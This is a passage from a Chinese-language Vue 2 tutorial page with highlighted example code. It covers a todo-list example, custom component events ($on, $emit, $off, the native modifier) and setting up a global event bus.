class="hljs-keyword">return</span> todo.<span class="hljs-property">id</span> != id</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">// 全选 or 取消全选</span></span><br><span class="language-javascript">      <span class="hljs-title function_">checkAll</span>(<span class="hljs-params">value</span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">todo</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">          todo.<span class="hljs-property">done</span> = value</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">//清除所有已经完成的todo</span></span><br><span class="language-javascript">      <span class="hljs-title function_">clearAllTodo</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">todo</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">          <span class="hljs-keyword">return</span> !todo.<span class="hljs-property">done</span></span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">watch</span>:&#123;</span><br><span class="language-javascript">      <span class="hljs-title function_">todos</span>(<span class="hljs-params">value</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&quot;todos&quot;</span>,<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(value))</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-comment">/*base*/</span></span><br><span class="language-css">  <span class="hljs-selector-tag">body</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">background</span>: <span class="hljs-number">#fff</span>;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.btn</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">display</span>: inline-block;</span><br><span class="language-css">    <span class="hljs-attribute">padding</span>: <span class="hljs-number">4px</span> <span class="hljs-number">12px</span>;</span><br><span class="language-css">    <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">0</span>;</span><br><span class="language-css">    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;</span><br><span class="language-css">    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">20px</span>;</span><br><span class="language-css">    <span class="hljs-attribute">text-align</span>: center;</span><br><span class="language-css">    <span class="hljs-attribute">vertical-align</span>: middle;</span><br><span class="language-css">    <span class="hljs-attribute">cursor</span>: pointer;</span><br><span class="language-css">    <span class="hljs-attribute">box-shadow</span>: inset <span class="hljs-number">0</span> <span class="hljs-number">1px</span> <span class="hljs-number">0</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.2</span>), <span class="hljs-number">0</span> <span class="hljs-number">1px</span> <span class="hljs-number">2px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.05</span>);</span><br><span class="language-css">    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.btn-danger</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;</span><br><span class="language-css">    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#da4f49</span>;</span><br><span class="language-css">    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#bd362f</span>;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.btn-danger</span><span class="hljs-selector-pseudo">:hover</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;</span><br><span class="language-css">    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#bd362f</span>;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.btn</span><span class="hljs-selector-pseudo">:focus</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">outline</span>: none;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.todo-container</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">width</span>: <span class="hljs-number">600px</span>;</span><br><span class="language-css">    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.todo-container</span> <span class="hljs-selector-class">.todo-wrap</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;</span><br><span class="language-css">    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;</span><br><span class="language-css">    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">5px</span>;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="2-4-组件自定义事件"><a href="#2-4-组件自定义事件" class="headerlink" title="2.4 组件自定义事件"></a>2.4 组件自定义事件</h2><ol><li><p>一种组件间通信的方式，适用于： <strong>子组件 &#x3D;&#x3D;&#x3D;&gt; 父组件</strong></p></li><li><p><strong>使用场景</strong> A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（事件的回调在A中）。</p></li></ol><p><strong>3. 绑定自定义事件 ：</strong></p><ul><li><p>第一种方式，在父组件中：<code>&lt;Demo @atguigu=&quot;test&quot;/&gt;</code>或 <code>&lt;Demo v-on:atguigu=&quot;test&quot;/</code></p></li><li><p>第二种方式，在父组件中<code>this.$refs.demo.$on(&#39;事件名&#39;,方法)</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;<span class="hljs-title class_">Demo</span> ref=<span class="hljs-string">&quot;demo&quot;</span>/&gt;<br>......<br><span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>)&#123;<br>   <span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">demo</span>.$on(<span class="hljs-string">&#x27;atguigu&#x27;</span>,<span class="hljs-variable language_">this</span>.<span class="hljs-property">test</span>)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>若想让自定义事件只能触发一次，可以使用<strong>once</strong>修饰符，或<code>$once</code>方法</p></li></ul><ol start="4"><li>触发自定义事件<code>this.$emit(&#39;事件名&#39;,数据)</code> </li><li>解绑自定义事件<code>this.$off(&#39;事件名&#39;)</code> </li><li>组件上也可以绑定原生DOM事件，需要使用native修饰符  <code>@click.native=&quot;show&quot;</code>上面绑定自定义事件，即使绑定的是原生事件也会被认为是自定义的，需要加<strong>native</strong>，加了后就将此事件给组件的根元素</li><li>注意：通过<code>this.$refs.xxx.$on(&#39;事件名&#39;,回调函数)</code>绑定自定义事件时，回调函数要么配置在<strong>methods</strong>中，要么用箭头函数，否则 this 指向会出问题</li></ol><blockquote><p>具体代码</p></blockquote><p>App.vue</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>&#123;&#123; msg &#125;&#125;，学生姓名是:&#123;&#123; studentName &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 通过父组件给子组件传递函数类型的props实现子给父传递数据 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">School</span> <span class="hljs-attr">:getSchoolName</span>=<span class="hljs-string">&quot;getSchoolName&quot;</span>/&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 通过父组件给子组件绑定一个自定义事件实现子给父传递数据（第一种写法，使用@或v-on） --&gt;</span><br>    <span class="hljs-comment">&lt;!-- &lt;Student @atguigu=&quot;getStudentName&quot; @demo=&quot;m1&quot;/&gt; --&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 通过父组件给子组件绑定一个自定义事件实现子给父传递数据（第二种写法，使用ref） --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Student</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;student&quot;</span> @<span class="hljs-attr">click.native</span>=<span class="hljs-string">&quot;show&quot;</span>/&gt;</span> <span class="hljs-comment">&lt;!-- 🔴native --&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/Student&#x27;</span></span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">School</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/School&#x27;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;App&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">components</span>:&#123;<span class="hljs-title class_">School</span>,<span class="hljs-title class_">Student</span>&#125;,</span><br><span class="language-javascript">    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">msg</span>:<span class="hljs-string">&#x27;你好啊！&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">studentName</span>:<span class="hljs-string">&#x27;&#x27;</span></span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-title function_">getSchoolName</span>(<span class="hljs-params">name</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;App收到了学校名：&#x27;</span>,name)</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-title function_">getStudentName</span>(<span class="hljs-params">name,...params</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;App收到了学生名：&#x27;</span>,name,params)</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">studentName</span> = name</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-title function_">m1</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;demo事件被触发了！&#x27;</span>)</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-title function_">show</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">alert</span>(<span class="hljs-number">123</span>)</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">student</span>.$on(<span class="hljs-string">&#x27;atguigu&#x27;</span>,<span class="hljs-variable language_">this</span>.<span class="hljs-property">getStudentName</span>) <span class="hljs-comment">// 🔴绑定自定义事件</span></span><br><span class="language-javascript">      <span class="hljs-comment">// this.$refs.student.$once(&#x27;atguigu&#x27;,this.getStudentName) // 绑定自定义事件（一次性）</span></span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"><span class="hljs-selector-class">.app</span>&#123;<span class="hljs-attribute">background-color</span>: gray;<span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Student.vue</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;student&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学生姓名：&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学生性别：&#123;&#123;sex&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>当前求和为：&#123;&#123;number&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>点我number++<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;sendStudentlName&quot;</span>&gt;</span>把学生名给App<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;unbind&quot;</span>&gt;</span>解绑atguigu事件<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;death&quot;</span>&gt;</span>销毁当前Student组件的实例(vc)<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;Student&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;张三&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;男&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">number</span>:<span class="hljs-number">0</span></span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript"><span class="hljs-title function_">add</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;add回调被调用了&#x27;</span>)</span><br><span class="language-javascript"><span class="hljs-variable language_">this</span>.<span class="hljs-property">number</span>++</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">sendStudentlName</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-comment">// 触发Student组件实例身上的atguigu事件</span></span><br><span class="language-javascript"><span class="hljs-variable language_">this</span>.$emit(<span class="hljs-string">&#x27;atguigu&#x27;</span>,<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>,<span class="hljs-number">666</span>,<span class="hljs-number">888</span>,<span class="hljs-number">900</span>)</span><br><span class="language-javascript"><span class="hljs-comment">// this.$emit(&#x27;demo&#x27;)</span></span><br><span class="language-javascript"><span class="hljs-comment">// this.$emit(&#x27;click&#x27;)</span></span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">unbind</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-comment">// 🔴解绑</span></span><br><span class="language-javascript"><span class="hljs-variable language_">this</span>.$off(<span class="hljs-string">&#x27;atguigu&#x27;</span>) <span class="hljs-comment">//解绑一个自定义事件</span></span><br><span class="language-javascript"><span class="hljs-comment">// this.$off([&#x27;atguigu&#x27;,&#x27;demo&#x27;]) //解绑多个自定义事件</span></span><br><span class="language-javascript"><span class="hljs-comment">// this.$off() //解绑所有的自定义事件</span></span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">death</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-comment">// 销毁了当前Student组件的实例，销毁后所有Student实例的自定义事件全都不奏效</span></span><br><span class="language-javascript"><span class="hljs-variable language_">this</span>.$destroy()</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;less&quot;</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-class">.student</span>&#123;<span class="hljs-attribute">background-color</span>: pink;<span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;<span class="hljs-attribute">margin-top</span>: <span class="hljs-number">30px</span>;&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​    </p><blockquote><p>若想让自定义事件只能触发一次，可以使用<code>once</code>修饰符，或<code>$once</code>方法。</p><p>触发自定义事件：<code>this.$emit(&#39;atguigu&#39;,数据)</code></p><p>使用 <code>this.$emit()</code> 就可以子组件向父组件传数据</p></blockquote><p><strong>解绑自定义事件</strong><code>this.$off(&#39;atguigu&#39;)</code></p><blockquote><p>代码</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">this</span>.$off(<span class="hljs-string">&#x27;atguigu&#x27;</span>) <span class="hljs-comment">//解绑一个自定义事件</span><br><span class="hljs-comment">// this.$off([&#x27;atguigu&#x27;,&#x27;demo&#x27;]) //解绑多个自定义事件</span><br><span class="hljs-comment">// this.$off() //解绑所有的自定义事件</span><br></code></pre></td></tr></table></figure><p><strong>组件上也可以绑定原生DOM事件 ，需要使用<code>native</code>修饰符。</strong></p><blockquote><p>代码</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第二种写法，使用ref） --&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Student</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;student&quot;</span> @<span class="hljs-attr">click.native</span>=<span class="hljs-string">&quot;show&quot;</span>/&gt;</span></span><br></code></pre></td></tr></table></figure><blockquote><p>注意：通过<code>this.$refs.xxx.$on(&#39;atguigu&#39;,回调)</code>绑定自定义事件时，回调要么配置在methods中，要么用箭头函数，否则this指向会出问题！</p></blockquote><h2 id="2-5-全局事件总线"><a href="#2-5-全局事件总线" class="headerlink" title="2.5 全局事件总线"></a>2.5 全局事件总线</h2><p>一种可以在任意组件间通信的方式，本质上就是一个对象，它必须满足以下条件</p><ol><li>所有的组件对象都必须能看见他 </li><li>这个对象必须能够使用$on$emit$off方法去绑定、触发和解绑事件</li></ol><p><strong>使用步骤</strong></p><ol><li><p>定义全局事件总线</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vue">new Vue(&#123;<br>   ...<br>   beforeCreate() &#123;<br>   Vue.prototype.$bus = this // 安装全局事件总线，$bus 就是当前应用的 vm<br>   &#125;,<br>    ...<br>&#125;)<br></code></pre></td></tr></table></figure></li><li><p>使用事件总线：</p><ol><li>接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的回调留在A组件自身。</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html">export default &#123;<br>    methods()&#123;<br>        demo(data)&#123;...&#125;<br>    &#125;<br>    ...<br>    mounted() &#123;<br>        this.$bus.$on(&#x27;xxx&#x27;,this.demo)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​2. 提供数据：<code>this.$bus.$emit(&#39;xxx&#39;,data)</code> </p></li><li><p>最好在beforeDestroy钩子中，用$off去解绑当前组件所用到的事件。</p></li></ol><blockquote><p>示例代码</p></blockquote><p>main.js</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vue">import Vue from &#x27;vue&#x27;<br>import App from &#x27;./App.vue&#x27;<br><br>Vue.config.productionTip = false<br><br>new Vue(&#123;<br>  el:&#x27;#app&#x27;,<br>  render: h =&gt; h(App),<br>  beforeCreate() &#123;<br>    Vue.prototype.$bus = this // 安装全局事件总线<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>App.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">School</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Student</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/Student&#x27;</span></span><br><span class="language-javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">School</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/School&#x27;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;App&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">components</span>:&#123; <span class="hljs-title class_">School</span>, <span class="hljs-title class_">Student</span> &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"><span class="hljs-selector-class">.app</span>&#123;<span class="hljs-attribute">background-color</span>: gray;<span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>School.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;school&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学校名称：&#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学校地址：&#123;&#123; address &#125;&#125;<span class="hljs-tag">&lt;/<span 